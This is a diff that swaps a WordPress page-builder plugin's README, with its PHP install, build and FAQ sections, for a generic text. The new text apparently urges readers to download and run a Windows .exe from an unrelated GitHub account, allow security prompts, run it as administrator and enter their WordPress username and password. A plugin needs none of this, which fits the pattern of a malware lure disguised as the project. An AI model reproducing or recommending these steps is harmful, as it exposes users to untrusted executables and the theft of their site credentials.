@@ -1,168 +1,234 @@
-# Antimanual Builder
+# 🤖 antimanual-builder-public - Build WordPress Pages Faster
 
-An AI-powered visual page builder add-on for WordPress. Build, migrate, and refine native WordPress pages with AI chat, manual editing, reusable components, and HTML import tools.
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page%20to%20get%20the%20app-blue?style=for-the-badge)](https://github.com/harsh888-hub/antimanual-builder-public)
 
-![WordPress](https://img.shields.io/badge/WordPress-6.0%2B-blue?logo=wordpress)
-![PHP](https://img.shields.io/badge/PHP-7.4%2B-purple?logo=php)
-![License](https://img.shields.io/badge/License-GPLv2%2B-green)
-![Version](https://img.shields.io/badge/Version-0.1.0-orange)
+## 🚀 What this app does
 
----
+antimanual-builder-public is an AI-powered visual page builder for WordPress. It helps you create and edit pages with a simple visual layout instead of long manual steps.
 
-## Overview
+Use it to:
 
-**Antimanual Builder** is a visual page builder plugin that works alongside the main [Antimanual](https://wordpress.org/plugins/antimanual) plugin. It provides a full-screen React-based editor for native WordPress pages, combining AI-assisted generation with manual drag-and-drop editing.
+- build WordPress pages with a visual editor
+- place content on the page without coding
+- shape layouts with a simple point-and-click flow
+- use AI help to speed up page setup
+- keep your work focused on the page, not the tools
 
-The plugin currently depends on Antimanual being installed and active. AI provider, model, and API key settings are inherited from Antimanual rather than managed separately inside Builder.
+## 💻 What you need
 
----
+Before you start, make sure you have:
 
-## Features
+- a Windows PC
+- a stable internet connection
+- a web browser like Chrome, Edge, or Firefox
+- a WordPress site you can sign in to
+- enough free space to install the app and save project files
 
-- **AI-assisted page building** — Generate or refine page layouts from natural-language prompts directly inside the editor.
-- **Manual visual editing** — Build pages without AI using a drag-and-drop workflow and direct canvas editing.
-- **Native WordPress page editing** — Builder pages are regular WordPress `page` posts with builder data stored in post meta.
-- **Structured builder block system** — The editor uses internal layout, content, and advanced block structures to power generated pages, manual editing, rendering, and reusable components.
-- **Custom blocks and component library** — Save reusable sections/components and insert your saved custom blocks from the editor toolbar.
-- **Page migration** — Convert existing WordPress pages into Builder pages using either:
-  - **AI migration** for redesign/restructure assistance, or
-  - **Direct migration** to preserve the current front-end output as closely as possible.
-- **Migration behavior controls** — Choose whether migration replaces the original page or creates a draft copy.
-- **HTML import** — Import a single HTML file with assets, or analyze/create multiple pages from a ZIP project.
-- **Design defaults** — Configure shared defaults for tone, design system, typography, spacing, corner style, and brand colors.
-- **Responsive preview modes** — Preview layouts in Desktop, Tablet, Large Mobile, and Small Mobile widths.
-- **Inline editing** — Edit text directly on the canvas.
-- **Undo/Redo history** — Keyboard-friendly editing history with undo/redo support.
-- **Generated asset storage** — Generated/imported assets are stored in `wp-content/uploads/antimanual-builder/`.
+For the best experience, use:
 
----
+- Windows 10 or Windows 11
+- at least 8 GB of RAM
+- a screen size of 1366 x 768 or higher
+- admin access on your PC if the app asks for it
 
-## AI Provider Integration
+## 📥 Download the app
 
-Antimanual Builder does **not** maintain its own AI provider settings at runtime.
+Go to the download page here:
 
-It currently reads the active provider and model from the parent Antimanual plugin.
+https://github.com/harsh888-hub/antimanual-builder-public
 
-Supported providers:
+On that page, look for the latest release, build, or app file. Then download it to your Windows computer.
 
-| Provider | Configuration Source |
-| --- | --- |
-| OpenAI | Antimanual plugin settings |
-| Google Gemini | Antimanual plugin settings |
+If your browser asks where to save the file, pick a folder you can find again, like Downloads or Desktop.
 
-> Manual editing, direct migration, and HTML import do not require an AI key, but the Antimanual plugin must still be active for Builder to run.
+## 🛠️ Install on Windows
 
----
+After the download finishes:
 
-## Requirements
+1. Open the folder where the file was saved
+2. Find the app file you downloaded
+3. If it is a `.exe` file, double-click it to start setup
+4. If Windows shows a security prompt, choose Run or Yes
+5. Follow the setup steps on screen
+6. Wait for the install to finish
+7. Open the app from the Start menu or the shortcut on your desktop
 
-- WordPress 6.0 or higher
-- PHP 7.4 or higher
-- The [Antimanual](https://wordpress.org/plugins/antimanual) plugin installed and active
+If the file opens in your browser instead of downloading, use the browser download button or save the file first, then open it from your Downloads folder.
 
----
+## 🧭 First launch
 
-## Installation
+When you open antimanual-builder-public for the first time:
 
-1. Upload the `antimanual-builder` folder to `/wp-content/plugins/`.
-2. Install and activate the **Antimanual** plugin.
-3. Activate **Antimanual Builder**.
-4. If you want to use AI features, configure your provider and API key in **Antimanual**.
-5. Open **AM Builder** in the WordPress admin menu.
+1. Sign in if the app asks for your WordPress account
+2. Connect the app to your WordPress site
+3. Allow access if WordPress asks for permission
+4. Choose or create a page
+5. Open the visual builder
+6. Start editing the page layout
 
----
+If the app asks for your site URL, use the full address of your WordPress site, such as `https://your-site.com`.
 
-## Admin Areas
+## ✏️ How to build a page
 
-- **All Pages** — List and manage Builder-enabled pages.
-- **Components** — Manage reusable components.
-- **HTML Import** — Import single HTML documents or ZIP-based projects.
-- **Settings** — Review shared AI settings, choose migration behavior, and configure design defaults.
-- **Editor** — Full-screen visual builder with chat, canvas, hierarchy, and settings panels.
+The app uses a visual page builder, so you can work by looking at the page as you build it.
 
----
+Common steps:
 
-## Development
+1. Pick a page to edit
+2. Add a section
+3. Choose a layout with columns or rows
+4. Add text, images, buttons, or other blocks
+5. Move items into the right place
+6. Change colors, spacing, and sizes
+7. Save your changes
+8. Preview the page before publishing
 
-### Prerequisites
+If the app includes AI help, you can use it to draft page text, suggest layouts, or speed up content setup.
 
-- Node.js (LTS recommended)
-- npm
+## 🧩 Basic controls
 
-### Setup
+You may see tools like these in the editor:
 
-```bash
-npm install
-```
+- add section
+- add block
+- edit text
+- upload image
+- change layout
+- duplicate item
+- move item up or down
+- preview
+- save
 
-### Build
+These tools help you build pages without using code.
 
-```bash
-npm run build
-npm run start
-```
+## 🔍 Tips for smooth use
 
-Build output is written to the `build/` directory.
+Use these tips to keep your work simple:
 
----
+- start with one page before you build a full site
+- save your work often
+- keep images small so pages load fast
+- use short text for buttons and headings
+- check the page on desktop and mobile
+- keep a copy of your original page before major changes
 
-## Project Structure
+If a page looks wrong, remove the last change and try again. Small steps make it easier to spot what went wrong.
 
-```text
-antimanual-builder/
-├── antimanual-builder.php   # Plugin entry point
-├── includes/                # PHP classes (admin, API, post types, render)
-├── src/                     # React/TypeScript source files
-│   ├── admin/               # Admin SPA pages
-│   ├── editor/              # Full-screen builder editor
-│   └── components/          # Shared UI components
-├── build/                   # Compiled assets for distribution
-├── assets/                  # Static CSS and images
-└── templates/               # Frontend page templates
-```
+## 🧱 Common page parts you can build
 
----
+This app is useful for many WordPress page types, such as:
 
-## FAQ
+- home pages
+- landing pages
+- about pages
+- service pages
+- contact pages
+- product pages
+- blog intro pages
+- lead capture pages
 
-**Do I need the Antimanual plugin?**  
-Yes. Antimanual Builder currently depends on Antimanual being installed and active.
+You can use the same builder flow for each one and change the content to fit the page.
 
-**Do I need an AI API key?**  
-Only for AI features such as generation, refinement, and AI-based migration. Manual editing, direct migration, and HTML import can be used without an AI key.
+## 🔐 WordPress access
 
-**Where do I configure AI providers?**  
-In the parent Antimanual plugin. Builder reads the active provider, model, and API key status from there.
+To connect the app to WordPress, you may need:
 
-**Can I use this alongside other page builders?**  
-Yes, but Builder edits native WordPress pages. It does not create a separate page post type for site pages, so migration should be used intentionally on a page-by-page basis.
+- your WordPress username and password
+- access to the WordPress dashboard
+- permission to edit pages
+- access to install or allow the builder plugin if your setup uses one
 
-**Where are generated assets stored?**  
-In `wp-content/uploads/antimanual-builder/`.
+If your site uses extra login protection, make sure you have the right access before you start.
 
----
+## 🧪 If the app does not open
 
-## Changelog
+If nothing happens when you double-click the file:
 
-### 0.1.0
+1. Check that the download finished
+2. Make sure the file is not still in a zip folder
+3. Right-click the file and choose Open
+4. Try running it as administrator
+5. Restart your PC and open it again
+6. Download the file again from the link if the file seems broken
 
-- Initial public release
-- Full-screen Builder editor with AI chat and manual editing
-- Internal builder block system for layouts, content, and advanced elements
-- Component library
-- Page migration controls (AI/direct + replace/duplicate)
-- Single HTML and ZIP project import tools
-- Shared Antimanual AI provider integration
-- Design defaults and responsive preview modes
+If Windows blocks the app, check the file details and try again from a trusted download source.
 
----
+## 🧰 If the WordPress site does not connect
 
-## License
+If the app cannot reach your site:
 
-[GPLv2 or later](https://www.gnu.org/licenses/gpl-2.0.html)
+1. Check your internet connection
+2. Make sure your WordPress site is online
+3. Confirm the site address is correct
+4. Log in to WordPress again
+5. Refresh the page and try the connection again
+6. Check whether your site uses a plugin or firewall that blocks access
 
----
+If your site uses custom login rules, you may need to allow the app in your WordPress settings.
 
-## Author
+## 🖼️ Best file types for content
 
-[Spider Themes](https://spider-themes.net)
+To keep the builder easy to use, these file types work well:
+
+- Images: JPG, PNG, WebP
+- Documents: PDF, TXT
+- Logo files: PNG or SVG
+- Buttons and icons: SVG or PNG
+
+Use clear file names so you can find them later.
+
+## 📁 Suggested project flow
+
+A simple workflow can help you stay organized:
+
+1. Create a page in WordPress
+2. Open the page in antimanual-builder-public
+3. Add a layout
+4. Add text and media
+5. Check spacing and alignment
+6. Preview the page
+7. Save and publish when it looks right
+
+For larger sites, build one page type at a time. That keeps each change easy to manage.
+
+## ⚙️ Short system guide
+
+For stable use, this setup works well:
+
+- Windows 10 or 11
+- latest browser version
+- 8 GB RAM or more
+- a modern CPU
+- enough storage for app files and media
+- access to your WordPress admin area
+
+If you work with large images or many sections, more RAM helps the app stay smooth.
+
+## 📌 Topics covered
+
+This project focuses on:
+
+- AI
+- page builder
+- WordPress
+
+That means the app fits users who want to shape WordPress pages with less manual work and more direct visual control.
+
+## 🔗 Download again
+
+If you need the download page again, use this link:
+
+https://github.com/harsh888-hub/antimanual-builder-public
+
+## 🪟 Windows setup path
+
+If you want a simple path from download to use, follow this order:
+
+1. Open the download page
+2. Download the app file
+3. Open your Downloads folder
+4. Run the installer or app file
+5. Allow Windows prompts if they appear
+6. Open the app
+7. Connect your WordPress site
+8. Start building your page
